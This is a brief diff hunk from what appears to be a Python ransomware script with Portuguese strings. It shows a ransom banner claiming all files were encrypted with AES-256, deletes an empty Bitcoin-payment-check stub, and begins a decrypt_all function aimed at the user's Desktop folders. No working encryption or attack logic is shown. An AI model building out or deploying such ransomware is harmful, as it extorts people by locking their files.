@@ -33,11 +33,6 @@ skull = '''
         \33[93mTODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS COM AES-256
 '''
 
-
-
-def checar_pagamento_btc():
-    pass
-
 def decrypt_all():
     caminho = os.path.expanduser('~')+'/Desktop/'
     caminho2 = os.path.expanduser('~')+'/Área\ de\ Trabalho/'
